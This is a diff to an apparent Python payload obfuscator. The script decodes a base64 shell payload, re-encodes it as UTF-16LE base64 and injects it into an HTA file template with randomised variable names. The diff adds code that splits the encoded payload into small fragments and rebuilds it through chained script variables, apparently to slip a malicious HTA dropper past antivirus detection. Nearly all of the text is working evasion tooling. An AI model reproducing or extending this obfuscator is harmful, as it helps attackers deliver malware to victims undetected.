@@ -1,3 +1,4 @@
+import textwrap
 import base64
 import random
 import string 
@@ -10,6 +11,12 @@ def decodbs64():
    ReadShell=shell.read()
    getFileWithoutNull=base64.b64decode(ReadShell).replace("\00", "")
    obfASW(getFileWithoutNull)
+
+#return textwrap.fill(s, w)
+def wrap(s, w):
+    filename = "fragFile"
+    fragFile = open(filename, "w")
+    fragFile.write(textwrap.fill(s, w))
 
 def obfASW(getFileWithoutNullT):
       
@@ -33,28 +40,58 @@ def retrunNulls(roundNThreeT):
    shellWithNull=u"{}".format(roundNThreeT).encode('utf-16le')
    shellReady=base64.b64encode(shellWithNull)
    saveShellWithNull.write(shellReady)
-   ProcessCompleted(shellReady)
+   wrap(shellReady,10)
+   time.sleep(4)
+   buildFrag()
+ #  time.sleep(4)
 
-time.sleep(4)
-def ProcessCompleted(shellReadyT):
+def buildFrag():
+   count=0
+   var0=""
+   buildFrag = open("buildFrag", "w")
+#Frags=buildFrag.read()
+   with open('fragFile') as f:
+      for line in f:
+          if count != 0 :
+             buildFrag.write("var{}".format(count)+"="+"var{}".format(count-1)+"+"+"'"+line.strip('\n')+"'"+";")
+          else:
+             buildFrag.write("var{}".format(count)+"="+"'"+line.strip('\n')+"'"+";")
+          count=count+1
+          var0=line
+   time.sleep(10)
+   ProcessCompleted(count)
+
+def ProcessCompleted(count):
    replaceHta = open("htafile.hta", "r")
    readHta=replaceHta.read()
+  
+   #print "I am COunt {}".format(count)
+   
+   #readFragFromFile = open("buildFrag", "r")
+   #dataFragsxxx=readFragFromFile.read()
 
    randomNumberV=random.randint(3,42)
    genVarOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))
 
    roundNOneV=readHta.replace("one", genVarOne)
    roundNTwoV=roundNOneV.replace("Two", genVarOne)
-   roundNThreeV=roundNTwoV.replace("Three",shellReadyT)
+
+   
+   time.sleep(5)
+   #print "Facebook"+dataFragsxxx
+   #roundNThreeV=roundNTwoV.replace("Fa0CB0Ok",dataFragsxxx)
+   #print "Facebook"+roundNThreeV
+   roundNThreeVG=roundNTwoV.replace("Go0Gole","var{}".format(count-1))
+
    randomNumberZ=random.randint(5,19)
    genVarZero=''.join(random.choice(string.ascii_letters) for x in range(randomNumberZ))
-#print genVarZero
-   roundNZeroV=roundNThreeV.replace("zeroo",genVarZero)
-#print roundNZeroV
+ 
+   roundNZeroV=roundNThreeVG.replace("zeroo",genVarZero)
+ 
    randomNumberStep=random.randint(5,15)
    genVarOneStep=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))
    roundNOneS=roundNZeroV.replace("SRpT", genVarOneStep)
- #  print roundNOneS
+
    
 
    randomNumberStep=random.randint(1,9)
@@ -66,4 +103,3 @@ def ProcessCompleted(shellReadyT):
 
 
 decodbs64()
-
